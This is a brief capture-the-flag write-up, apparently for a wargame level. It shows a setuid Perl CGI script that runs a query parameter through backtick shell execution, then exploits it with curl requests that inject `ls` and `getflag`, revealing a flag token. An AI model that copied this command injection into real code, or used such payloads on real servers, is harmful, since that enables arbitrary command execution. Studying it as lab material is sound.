There's a perl script that will be used

```sh
$> ls -l ~/
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

$> cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  # We can see that whatever we put in $y, it will be executed
  print `echo $y 2>&1`;
}
x(param("x"));

$> curl 'localhost:4747?x=`ls`'
level04.pl

$> curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
